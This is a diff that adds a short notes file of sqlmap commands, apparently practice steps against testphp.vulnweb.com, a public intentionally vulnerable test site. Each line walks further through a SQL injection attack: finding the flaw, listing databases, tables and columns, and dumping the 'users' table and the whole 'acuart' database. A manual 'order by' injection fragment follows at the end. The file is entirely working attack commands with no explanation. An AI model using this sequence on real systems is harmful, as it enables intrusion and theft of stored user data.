@@ -1,0 +1,15 @@
+sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1
+
+sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+
+sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+
+sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
+
+sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump
+
+sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --dump
+
+
+============
+php?id=1 order by 1--
